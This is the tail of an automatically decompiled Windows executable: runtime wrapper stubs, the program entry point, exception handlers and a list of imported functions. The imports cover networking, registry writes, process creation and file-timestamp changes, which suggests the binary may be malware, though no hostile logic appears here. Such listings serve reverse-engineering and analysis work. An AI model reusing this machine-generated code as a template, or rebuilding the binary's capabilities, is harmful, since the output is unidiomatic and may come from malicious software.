    int32_t v6; // 0x4085f0
    int32_t v7 = v6 - 0x1000; // 0x408602
    while (v7 >= 0x1000) {
        // 0x4085fc
        v3 -= 0x1000;
        v7 -= 0x1000;
    }
    // 0x408610
    *(int32_t *)(-4 - v7 + v3) = result;
    return result;
}

// Address range: 0x408620 - 0x408626
int32_t function_408620(char * s, struct _IO_FILE * stream) {
    // 0x408620
    return fputs(s, stream);
}

// Address range: 0x408626 - 0x40862c
int32_t function_408626(struct _IO_FILE * stream, int32_t off, int32_t whence) {
    // 0x408626
    return fseek(stream, off, whence);
}

// Address range: 0x40862c - 0x408632
int32_t function_40862c(struct _IO_FILE * stream) {
    // 0x40862c
    return ftell(stream);
}

// Address range: 0x408632 - 0x408638
char * function_408632(char * Str, char * Substr) {
    // 0x408632
    return _mbsstr(Str, Substr);
}

// Address range: 0x408638 - 0x40863e
float64_t function_408638(int32_t time1, int32_t time0) {
    // 0x408638
    return difftime(time1, time0);
}

// Address range: 0x40863e - 0x408644
int32_t function_40863e(int32_t * timer) {
    // 0x40863e
    return time(timer);
}

// Address range: 0x408644 - 0x40864a
int32_t function_408644(void) {
    // 0x408644
    return _ftol();
}

// Address range: 0x40864a - 0x408650
int32_t function_40864a(void) {
    // 0x40864a
    return _mbsnbcpy();
}

// Address range: 0x408650 - 0x408656
char * function_408650(char * Str, int32_t C) {
    // 0x408650
    return _mbschr(Str, C);
}

// Address range: 0x408656 - 0x40865c
int32_t function_408656(void) {
    // 0x408656
    return rand();
}

// Address range: 0x40865c - 0x408662
char * function_40865c(char * String) {
    // 0x40865c
    return _mbsrev(String);
}

// Address range: 0x408662 - 0x408668
char * function_408662(char * dest, char * src) {
    // 0x408662
    return strcat(dest, src);
}

// Address range: 0x408668 - 0x40866e
void function_408668(int32_t status) {
    // 0x408668
    exit(status);
}

// Address range: 0x40866e - 0x408674
int32_t function_40866e(char * Str1, char * Str2) {
    // 0x40866e
    return _mbsicmp(Str1, Str2);
}

// Address range: 0x408674 - 0x40867a
char * function_408674(int32_t value, char * str, int32_t radix) {
    // 0x408674
    return _itoa(value, str, radix);
}

// Address range: 0x40867a - 0x408680
int32_t function_40867a(char * Str1, char * Str2) {
    // 0x40867a
    return _mbscmp(Str1, Str2);
}

// Address range: 0x408680 - 0x408686
int32_t function_408680(char * s, int32_t maxsize, char * format, struct tm * tp) {
    // 0x408680
    return strftime(s, maxsize, format, tp);
}

// Address range: 0x408686 - 0x40868c
struct tm * function_408686(int32_t * timer) {
    // 0x408686
    return localtime(timer);
}

// Address range: 0x40868c - 0x408692
int32_t function_40868c(char * nptr) {
    // 0x40868c
    return atoi(nptr);
}

// Address range: 0x408692 - 0x408698
int32_t function_408692(int32_t c) {
    // 0x408692
    return isalpha(c);
}

// Address range: 0x408698 - 0x40869e
int32_t function_408698(char * Str1, char * Str2, int32_t MaxCount) {
    // 0x408698
    return _mbsnbcmp(Str1, Str2, MaxCount);
}

// Address range: 0x40869e - 0x4087dc
int32_t entry_point(void) {
    int32_t v1 = __readfsdword(0); // bp-20, 0x4086b3
    __writefsdword(0, (int32_t)&v1);
    __set_app_type(2);
    g55 = (void (***)())-1;
    g56 = (void (***)())-1;
    *__p__fmode() = g52;
    *__p__commode() = g51;
    g54 = *(int32_t *)*(int32_t *)0x40c0d4;
    function_408829();
    if (g24 == 0) {
        // 0x408715
        __setusermatherr(0x408826);
    }
    // 0x408721
    __setdefaultprecision();
    _initterm((void (**)())&g16, (void (**)())&g17);
    int32_t v2 = g50; // bp-112, 0x40873a
    int32_t v3; // bp-100, 0x40869e
    int32_t v4; // bp-104, 0x40869e
    int32_t v5; // bp-116, 0x40869e
    __getmainargs(&v3, (char ***)&v5, (char ***)&v4, g49, &v2);
    _initterm((void (**)())&g14, (void (**)())&g15);
    int32_t v6 = *(int32_t *)*(int32_t *)0x40c0c4; // 0x408770
    unsigned char v7 = *(char *)v6; // 0x408775
    int32_t v8 = v6; // 0x408778
    char v9; // 0x40869e
    int32_t v10; // 0x40869e
    int32_t v11; // 0x40869e
    if (v7 != 34) {
        char v12 = v7; // 0x4087b7
        int32_t v13 = v6; // 0x4087b7
        if (v7 >= 33) {
            int32_t v14 = v6 + 1;
            unsigned char v15 = *(char *)v14;
            v12 = v15;
            v13 = v14;
            int32_t v16 = v14; // 0x4087b7
            while (v15 >= 33) {
                // 0x4087b4
                v14 = v16 + 1;
                v15 = *(char *)v14;
                v12 = v15;
                v13 = v14;
                v16 = v14;
            }
        }
        // 0x408791
        v9 = v12;
        v11 = v13;
        goto lab_0x408791;
    } else {
        v8++;
        char v17 = *(char *)v8; // 0x40877e
        while (v17 != 0 == (v17 != 34)) {
            // 0x40877a
            v8++;
            v17 = *(char *)v8;
        }
        // 0x408788
        v10 = v8;
        v9 = v17;
        v11 = v8;
        if (v17 != 34) {
            goto lab_0x408791;
        } else {
            goto lab_0x40878d;
        }
    }
  lab_0x408791:
    // 0x408791
    v10 = v11;
    if (v9 >= 33) {
        // 0x40879b
        int32_t lpStartupInfo; // bp-96, 0x40869e
        GetStartupInfoA((struct _STARTUPINFOA *)&lpStartupInfo);
        int32_t * moduleHandle = GetModuleHandleA(NULL); // 0x4087c6
        exit(function_40630e((int32_t)moduleHandle));
        // UNREACHABLE
    }
    goto lab_0x40878d;
  lab_0x40878d:;
    int32_t v18 = v10 + 1; // 0x40878d
    v9 = *(char *)v18;
    v11 = v18;
    goto lab_0x408791;
}

// Address range: 0x4087dc - 0x4087f0
int32_t function_4087dc(void) {
    // 0x4087dc
    int32_t v1; // 0x4087dc
    int32_t * v2 = (int32_t *)*(int32_t *)(v1 - 20); // 0x4087df
    int32_t v3 = *(int32_t *)*v2; // 0x4087e1
    *(int32_t *)(v1 - 120) = v3;
    return _XcptFilter(v3, v2);
}

// Address range: 0x4087fc - 0x408802
int32_t (*function_4087fc(int32_t (*func)(), void (***pbegin)(), void (***pend)()))() {
    // 0x4087fc
    return __dllonexit(func, pbegin, pend);
}

// Address range: 0x408802 - 0x408808
// Demangled:     public: virtual __thiscall type_info::~type_info(void)
int32_t ??1type_info@@UAE@XZ(void) {
    // 0x408802
    return _3f__3f_1type_info_40__40_UAE_40_XZ();
}

// Address range: 0x408808 - 0x40880e
int32_t function_408808(int32_t xcptnum, int32_t * pxcptinfoptrs) {
    // 0x408808
    return _XcptFilter(xcptnum, pxcptinfoptrs);
}

// Address range: 0x40880e - 0x408814
void function_40880e(void (**First)(), void (**Last)()) {
    // 0x40880e
    _initterm(First, Last);
}

// Address range: 0x408826 - 0x408829
int32_t function_408826(void) {
    // 0x408826
    return 0;
}

// Address range: 0x408829 - 0x40882a
int32_t function_408829(void) {
    // 0x408829
    int32_t result; // 0x408829
    return result;
}

// Address range: 0x40882a - 0x408830
int32_t function_40882a(struct _EXCEPTION_RECORD * exception_record, int32_t registration, struct _CONTEXT * context, int32_t dispatcher) {
    // 0x40882a
    return _except_handler3(exception_record, registration, context, dispatcher);
}

// Address range: 0x408830 - 0x408836
int32_t __controlfp(int32_t NewValue, int32_t Mask) {
    // 0x408830
    return _controlfp(NewValue, Mask);
}

// Address range: 0x408838 - 0x408840
int32_t function_408838(void) {
    // 0x408838
    return function_4047af();
}

// Address range: 0x408840 - 0x40884a
int32_t function_408840(void) {
    // 0x408840
    return __CxxFrameHandler(&g57, &g57, &g57, &g57);
}

// Address range: 0x40884c - 0x408854
int32_t function_40884c(void) {
    // 0x40884c
    return function_4047af();
}

// Address range: 0x408854 - 0x40885e
int32_t function_408854(void) {
    // 0x408854
    return __CxxFrameHandler(&g57, &g57, &g57, &g57);
}

// Address range: 0x408860 - 0x408868
int32_t function_408860(void) {
    // 0x408860
    return _3f__3f_1exception_40__40_UAE_40_XZ();
}

// Address range: 0x408868 - 0x408872
int32_t function_408868(void) {
    // 0x408868
    return __CxxFrameHandler(&g57, &g57, &g57, &g57);
}

// Address range: 0x408874 - 0x40887c
int32_t function_408874(void) {
    // 0x408874
    return _3f__3f_1exception_40__40_UAE_40_XZ();
}

// Address range: 0x40887c - 0x408886
int32_t function_40887c(void) {
    // 0x40887c
    return __CxxFrameHandler(&g57, &g57, &g57, &g57);
}

// Address range: 0x408888 - 0x408890
int32_t function_408888(void) {
    // 0x408888
    return _3f__3f_1exception_40__40_UAE_40_XZ();
}

// Address range: 0x408890 - 0x40889a
int32_t function_408890(void) {
    // 0x408890
    return __CxxFrameHandler(&g57, &g57, &g57, &g57);
}

// Address range: 0x40889c - 0x4088a4
int32_t function_40889c(void) {
    // 0x40889c
    return _3f__3f_1exception_40__40_UAE_40_XZ();
}

// Address range: 0x4088a4 - 0x4088ae
int32_t function_4088a4(void) {
    // 0x4088a4
    return __CxxFrameHandler(&g57, &g57, &g57, &g57);
}

// Address range: 0x4088b0 - 0x4088b8
int32_t function_4088b0(void) {
    // 0x4088b0
    return function_4047af();
}

// Address range: 0x4088b8 - 0x4088c2
int32_t function_4088b8(void) {
    // 0x4088b8
    return __CxxFrameHandler(&g57, &g57, &g57, &g57);
}

// Address range: 0x4088c4 - 0x4088cc
int32_t function_4088c4(void) {
    // 0x4088c4
    return _3f__3f_1exception_40__40_UAE_40_XZ();
}

// Address range: 0x4088cc - 0x4088d6
int32_t function_4088cc(void) {
    // 0x4088cc
    return __CxxFrameHandler(&g57, &g57, &g57, &g57);
}

// Address range: 0x4088d8 - 0x4088e0
int32_t function_4088d8(void) {
    // 0x4088d8
    return function_4047af();
}

// Address range: 0x4088e0 - 0x4088e8
int32_t function_4088e0(void) {
    // 0x4088e0
    return function_4047af();
}

// Address range: 0x4088e8 - 0x4088f0
int32_t function_4088e8(void) {
    // 0x4088e8
    return function_4047af();
}

// Address range: 0x4088f0 - 0x4088f8
int32_t function_4088f0(void) {
    // 0x4088f0
    return function_4047af();
}

// Address range: 0x4088f8 - 0x408900
int32_t function_4088f8(void) {
    // 0x4088f8
    return function_4047af();
}

// Address range: 0x408900 - 0x408908
int32_t function_408900(void) {
    // 0x408900
    return function_4047af();
}

// Address range: 0x408908 - 0x408910
int32_t function_408908(void) {
    // 0x408908
    return function_4047af();
}

// Address range: 0x408910 - 0x40891a
int32_t function_408910(void) {
    // 0x408910
    return __CxxFrameHandler(&g57, &g57, &g57, &g57);
}

// Address range: 0x40891c - 0x408926
int32_t function_40891c(void) {
    // 0x40891c
    return __CxxFrameHandler(&g57, &g57, &g57, &g57);
}

// Address range: 0x408928 - 0x408930
int32_t function_408928(void) {
    // 0x408928
    return function_4047af();
}

// Address range: 0x408930 - 0x40893a
int32_t function_408930(void) {
    // 0x408930
    return __CxxFrameHandler(&g57, &g57, &g57, &g57);
}

// Address range: 0x40893c - 0x408944
int32_t function_40893c(void) {
    // 0x40893c
    return function_4047af();
}

// Address range: 0x408944 - 0x40894e
int32_t function_408944(void) {
    // 0x408944
    return __CxxFrameHandler(&g57, &g57, &g57, &g57);
}

// Address range: 0x408950 - 0x408958
int32_t function_408950(void) {
    // 0x408950
    return function_4047af();
}

// Address range: 0x408958 - 0x408962
int32_t function_408958(void) {
    // 0x408958
    return __CxxFrameHandler(&g57, &g57, &g57, &g57);
}

// Address range: 0x408964 - 0x40896e
int32_t function_408964(void) {
    // 0x408964
    return __CxxFrameHandler(&g57, &g57, &g57, &g57);
}

// Address range: 0x408970 - 0x408978
int32_t function_408970(void) {
    // 0x408970
    return function_4047af();
}

// Address range: 0x408978 - 0x408980
int32_t function_408978(void) {
    // 0x408978
    return function_4047af();
}

// Address range: 0x408980 - 0x40898a
int32_t function_408980(void) {
    // 0x408980
    return __CxxFrameHandler(&g57, &g57, &g57, &g57);
}

// Address range: 0x40898c - 0x408994
int32_t function_40898c(void) {
    // 0x40898c
    return ??1?$_Mpunct@D@std@@MAE@XZ4();
}

// Address range: 0x408994 - 0x40899f
int32_t function_408994(void) {
    // 0x408994
    return ??1?$_Mpunct@D@std@@MAE@XZ6();
}

// Address range: 0x40899f - 0x4089a7
int32_t function_40899f(void) {
    // 0x40899f
    return _3f__3f_1_3f__24__Mpunct_40_D_40_std_40__40_MAE_40_XZ();
}

// Address range: 0x4089a7 - 0x4089b1
int32_t function_4089a7(void) {
    // 0x4089a7
    return __CxxFrameHandler(&g57, &g57, &g57, &g57);
}

// Address range: 0x4089b4 - 0x4089bc
int32_t function_4089b4(void) {
    // 0x4089b4
    return function_4047af();
}

// Address range: 0x4089bc - 0x4089c6
int32_t function_4089bc(void) {
    // 0x4089bc
    return __CxxFrameHandler(&g57, &g57, &g57, &g57);
}

// Address range: 0x4089c8 - 0x4089d0
int32_t function_4089c8(void) {
    // 0x4089c8
    return ??1?$_Mpunct@D@std@@MAE@XZ5();
}

// Address range: 0x4089d0 - 0x4089d8
int32_t function_4089d0(void) {
    // 0x4089d0
    return function_4047af();
}

// Address range: 0x4089d8 - 0x4089e0
int32_t function_4089d8(void) {
    // 0x4089d8
    return function_407387();
}

// Address range: 0x4089e0 - 0x4089ea
int32_t function_4089e0(void) {
    // 0x4089e0
    return __CxxFrameHandler(&g57, &g57, &g57, &g57);
}

// Address range: 0x4089ec - 0x4089f4
int32_t function_4089ec(void) {
    // 0x4089ec
    return function_4047af();
}

// Address range: 0x4089f4 - 0x4089fe
int32_t function_4089f4(void) {
    // 0x4089f4
    return __CxxFrameHandler(&g57, &g57, &g57, &g57);
}

// Address range: 0x408a00 - 0x408a0e
int32_t function_408a00(void) {
    // 0x408a00
    int32_t v1; // 0x408a00
    return function_4078aa(*(int32_t *)(v1 - 16), *(int32_t *)(v1 + 8));
}

// Address range: 0x408a0e - 0x408a18
int32_t function_408a0e(void) {
    // 0x408a0e
    return __CxxFrameHandler(&g57, &g57, &g57, &g57);
}

// Address range: 0x408a18 - 0x408a22
int32_t function_408a18(void) {
    // 0x408a18
    return __CxxFrameHandler(&g57, &g57, &g57, &g57);
}

// Address range: 0x408a24 - 0x408a2e
int32_t function_408a24(void) {
    // 0x408a24
    return __CxxFrameHandler(&g57, &g57, &g57, &g57);
}

// Address range: 0x408a30 - 0x408a38
int32_t function_408a30(void) {
    // 0x408a30
    return ??1?$_Mpunct@D@std@@MAE@XZ();
}

// Address range: 0x408a38 - 0x408a42
int32_t function_408a38(void) {
    // 0x408a38
    return __CxxFrameHandler(&g57, &g57, &g57, &g57);
}

// --------------- Statically Linked Functions ----------------

// int32_t _3f__3f__Gtype_info_40__40_UAEPAXI_40_Z(int32_t a1);
// int32_t __setdefaultprecision(void);

// --------------- Dynamically Linked Functions ---------------

// int32_t _3f__3f_0exception_40__40_QAE_40_ABQBD_40_Z(char ** a1);
// int32_t _3f__3f_0exception_40__40_QAE_40_ABV0_40__40_Z(int32_t * a1);
// int32_t _3f__3f_1exception_40__40_UAE_40_XZ(void);
// int32_t _3f__3f_1type_info_40__40_UAE_40_XZ(void);
// int32_t _3f__3f_2_40_YAPAXI_40_Z(int32_t a1);
// int32_t _3f__3f_3_40_YAXPAX_40_Z(int32_t * a1);
// EXCEPTION_DISPOSITION __CxxFrameHandler(EHExceptionRecord * pExcept, EHRegistrationNode * pRN, void * pContext, DispatcherContext * pDC);
// _onexit_t __dllonexit(_onexit_t func, _PVFV ** pbegin, _PVFV ** pend);
// int __getmainargs(int * Argc, char *** Argv, char *** Env, int DoWildCard, _startupinfo * StartInfo);
// int * __cdecl __p__commode(void);
// int * __cdecl __p__fmode(void);
// void __set_app_type(int at);
// void __setusermatherr(_HANDLE_MATH_ERROR pf);
// unsigned int __cdecl _controlfp(_In_ unsigned int NewValue, _In_ unsigned int Mask);
// void __stdcall _CxxThrowException(void * pExceptionObject, _ThrowInfo * pThrowInfo);
// int _except_handler3(PEXCEPTION_RECORD exception_record, PEXCEPTION_REGISTRATION registration, PCONTEXT context, PEXCEPTION_REGISTRATION dispatcher);
// int32_t _ftol(void);
// void __cdecl _initterm(_In_ _PVFV * First, _In_ _PVFV * Last);
// char * _itoa(int value, char * str, int radix);
// unsigned char _CONST_RETURN * __cdecl _mbschr(_In_z_ unsigned char const * Str, _In_ unsigned int C);
// int __cdecl _mbscmp(_In_z_ unsigned char const * Str1, _In_z_ unsigned char const * Str2);
// int __cdecl _mbsicmp(_In_z_ unsigned char const * Str1, _In_z_ unsigned char const * Str2);
// unsigned char * __cdecl _mbsinc(_In_z_ unsigned char const * Ptr);
// int __cdecl _mbsnbcmp(_In_z_ unsigned char const * Str1, _In_z_ unsigned char const * Str2, _In_ size_t MaxCount);
// int32_t _mbsnbcpy(void);
// unsigned char * __cdecl _mbsninc(unsigned char const * String, _In_ size_t Count);
// unsigned char _CONST_RETURN * __cdecl _mbsrchr(_In_z_ unsigned char const * String, _In_ unsigned int C);
// unsigned char * __cdecl _mbsrev(_Inout_z_ unsigned char * String);
// unsigned char _CONST_RETURN * __cdecl _mbsstr(_In_z_ unsigned char const * Str, _In_z_ unsigned char const * Substr);
// size_t __cdecl _msize(void * Block);
// _onexit_t _onexit(_onexit_t Function);
// int _XcptFilter(unsigned long xcptnum, void * pxcptinfoptrs);
// int atoi(const char * nptr);
// BOOL CloseHandle(_In_ HANDLE hObject);
// int closesocket(_In_ SOCKET s);
// int connect(_In_ SOCKET s, const struct sockaddr * name, _In_ int namelen);
// BOOL CreateDirectoryA(_In_ LPCSTR lpPathName, _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes);
// HANDLE CreateEventA(_In_opt_ LPSECURITY_ATTRIBUTES lpEventAttributes, _In_ BOOL bManualReset, _In_ BOOL bInitialState, _In_opt_ LPCSTR lpName);
// HANDLE CreateFileA(_In_ LPCSTR lpFileName, _In_ DWORD dwDesiredAccess, _In_ DWORD dwShareMode, _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes, _In_ DWORD dwCreationDisposition, _In_ DWORD dwFlagsAndAttributes, _In_opt_ HANDLE hTemplateFile);
// BOOL CreateProcessA(_In_opt_ LPCSTR lpApplicationName, _Inout_opt_ LPSTR lpCommandLine, _In_opt_ LPSECURITY_ATTRIBUTES lpProcessAttributes, _In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes, _In_ BOOL bInheritHandles, _In_ DWORD dwCreationFlags, _In_opt_ LPVOID lpEnvironment, _In_opt_ LPCSTR lpCurrentDirectory, _In_ LPSTARTUPINFOA lpStartupInfo, _Out_ LPPROCESS_INFORMATION lpProcessInformation);
// HANDLE CreateThread(_In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes, _In_ SIZE_T dwStackSize, _In_ LPTHREAD_START_ROUTINE lpStartAddress, _In_opt_ LPVOID lpParameter, _In_ DWORD dwCreationFlags, _Out_opt_ LPDWORD lpThreadId);
// BOOL DeleteFileA(_In_ LPCSTR lpFileName);
// double difftime(time_t time1, time_t time0);
// void exit(int status);
// int fclose(FILE * stream);
// BOOL FindClose(_Inout_ HANDLE hFindFile);
// HANDLE FindFirstFileA(_In_ LPCSTR lpFileName, _Out_ LPWIN32_FIND_DATAA lpFindFileData);
// BOOL FindNextFileA(_In_ HANDLE hFindFile, _Out_ LPWIN32_FIND_DATAA lpFindFileData);
// FILE * fopen(const char * restrict filename, const char * restrict modes);
// int fputs(const char * restrict s, FILE * restrict stream);
// size_t fread(void * restrict ptr, size_t size, size_t n, FILE * restrict stream);
// void free(void * ptr);
// BOOL FreeLibrary(_In_ HMODULE hLibModule);
// int fseek(FILE * stream, long int off, int whence);
// long int ftell(FILE * stream);
// size_t fwrite(const void * restrict ptr, size_t size, size_t n, FILE * restrict s);
// BOOL GetComputerNameA(LPSTR lpBuffer, _Inout_ LPDWORD nSize);
// DWORD GetFileAttributesA(_In_ LPCSTR lpFileName);
// DWORD GetFileSize(_In_ HANDLE hFile, _Out_opt_ LPDWORD lpFileSizeHigh);
// BOOL GetFileTime(_In_ HANDLE hFile, _Out_opt_ LPFILETIME lpCreationTime, _Out_opt_ LPFILETIME lpLastAccessTime, _Out_opt_ LPFILETIME lpLastWriteTime);
// struct hostent * gethostbyname(_In_z_ const char * name);
// int gethostname(char * name, _In_ int namelen);
// DWORD GetLastError(VOID);
// DWORD GetModuleFileNameA(_In_opt_ HMODULE hModule, LPSTR lpFilename, _In_ DWORD nSize);
// HMODULE GetModuleHandleA(_In_opt_ LPCSTR lpModuleName);
// DWORD GetPrivateProfileStringA(_In_opt_ LPCSTR lpAppName, _In_opt_ LPCSTR lpKeyName, _In_opt_ LPCSTR lpDefault, LPSTR lpReturnedString, _In_ DWORD nSize, _In_opt_ LPCSTR lpFileName);
// FARPROC GetProcAddress(_In_ HMODULE hModule, _In_ LPCSTR lpProcName);
// VOID GetStartupInfoA(_Out_ LPSTARTUPINFOA lpStartupInfo);
// UINT GetSystemDirectoryA(LPSTR lpBuffer, _In_ UINT uSize);
// UINT GetTempFileNameA(_In_ LPCSTR lpPathName, _In_ LPCSTR lpPrefixString, _In_ UINT uUnique, LPSTR lpTempFileName);
// DWORD GetTempPathA(_In_ DWORD nBufferLength, LPSTR lpBuffer);
// BOOL GetUserNameA(LPSTR lpBuffer, _Inout_ LPDWORD pcbBuffer);
// NOT_BUILD_WINDOWS_DEPRECATE BOOL GetVersionExA(_Inout_ LPOSVERSIONINFOA lpVersionInformation);
// u_short htons(_In_ u_short hostshort);
// unsigned long inet_addr(_In_z_ const char * cp);
// BOOL InitializeSecurityDescriptor(_Out_ PSECURITY_DESCRIPTOR pSecurityDescriptor, _In_ DWORD dwRevision);
// int isalpha(int c);
// HMODULE LoadLibraryA(_In_ LPCSTR lpLibFileName);
// struct tm * localtime(const time_t * timer);
// void * malloc(size_t size);
// void * memcpy(void * restrict dest, const void * restrict src, size_t n);
// void * memmove(void * dest, const void * src, size_t n);
// void * memset(void * s, int c, size_t n);
// int MessageBoxA(_In_opt_ HWND hWnd, _In_opt_ LPCSTR lpText, _In_opt_ LPCSTR lpCaption, _In_ UINT uType);
// HANDLE OpenEventA(_In_ DWORD dwDesiredAccess, _In_ BOOL bInheritHandle, _In_ LPCSTR lpName);
// int rand(void);
// BOOL ReadFile(_In_ HANDLE hFile, LPVOID lpBuffer, _In_ DWORD nNumberOfBytesToRead, _Out_opt_ LPDWORD lpNumberOfBytesRead, _Inout_opt_ LPOVERLAPPED lpOverlapped);
// void * realloc(void * ptr, size_t size);
// int recv(_In_ SOCKET s, char * buf, _In_ int len, _In_ int flags);
// LSTATUS RegCloseKey(_In_ HKEY hKey);
// LSTATUS RegCreateKeyExA(_In_ HKEY hKey, _In_ LPCSTR lpSubKey, DWORD Reserved, _In_opt_ LPSTR lpClass, _In_ DWORD dwOptions, _In_ REGSAM samDesired, _In_opt_ const LPSECURITY_ATTRIBUTES lpSecurityAttributes, _Out_ PHKEY phkResult, _Out_opt_ LPDWORD lpdwDisposition);
// LSTATUS RegDeleteValueA(_In_ HKEY hKey, _In_opt_ LPCSTR lpValueName);
// LSTATUS RegOpenKeyExA(_In_ HKEY hKey, _In_opt_ LPCSTR lpSubKey, _In_opt_ DWORD ulOptions, _In_ REGSAM samDesired, _Out_ PHKEY phkResult);
// LSTATUS RegSetValueExA(_In_ HKEY hKey, _In_opt_ LPCSTR lpValueName, DWORD Reserved, _In_ DWORD dwType, const BYTE * lpData, _In_ DWORD cbData);
// int send(_In_ SOCKET s, const char * buf, _In_ int len, _In_ int flags);
// BOOL SetFileAttributesA(_In_ LPCSTR lpFileName, _In_ DWORD dwFileAttributes);
// DWORD SetFilePointer(_In_ HANDLE hFile, _In_ LONG lDistanceToMove, _Inout_opt_ PLONG lpDistanceToMoveHigh, _In_ DWORD dwMoveMethod);
// BOOL SetFileTime(_In_ HANDLE hFile, _In_opt_ const FILETIME * lpCreationTime, _In_opt_ const FILETIME * lpLastAccessTime, _In_opt_ const FILETIME * lpLastWriteTime);
// BOOL SetSecurityDescriptorDacl(_Inout_ PSECURITY_DESCRIPTOR pSecurityDescriptor, _In_ BOOL bDaclPresent, _In_opt_ PACL pDacl, _In_ BOOL bDaclDefaulted);
// HRESULT SHGetMalloc(IMalloc ** ppMalloc);
// BOOL SHGetPathFromIDListA(_In_ PCIDLIST_ABSOLUTE pidl, LPSTR pszPath);
// HRESULT SHGetSpecialFolderLocation(HWND hwnd, _In_ int csidl, PIDLIST_ABSOLUTE * ppidl);
// VOID Sleep(_In_ DWORD dwMilliseconds);
// SOCKET socket(_In_ int af, _In_ int type, _In_ int protocol);
// int sprintf(char * restrict s, const char * restrict format, ...);
// char * strcat(char * restrict dest, const char * restrict src);
// char * strcpy(char * restrict dest, const char * restrict src);
// size_t strftime(char * restrict s, size_t maxsize, const char * restrict format, const struct tm * restrict tp);
// size_t strlen(const char * s);
// time_t time(time_t * timer);
// DWORD WaitForSingleObject(_In_ HANDLE hHandle, _In_ DWORD dwMilliseconds);
// BOOL WriteFile(_In_ HANDLE hFile, LPCVOID lpBuffer, _In_ DWORD nNumberOfBytesToWrite, _Out_opt_ LPDWORD lpNumberOfBytesWritten, _Inout_opt_ LPOVERLAPPED lpOverlapped);
// int WSACleanup(void);
// int WSAGetLastError(void);
// int WSAStartup(_In_ WORD wVersionRequested, _Out_ LPWSADATA lpWSAData);

// --------------------- Meta-Information ---------------------

// Detected compiler/packer: microsoft linker (6.0)
// Detected language: C++
// Detected functions: 239
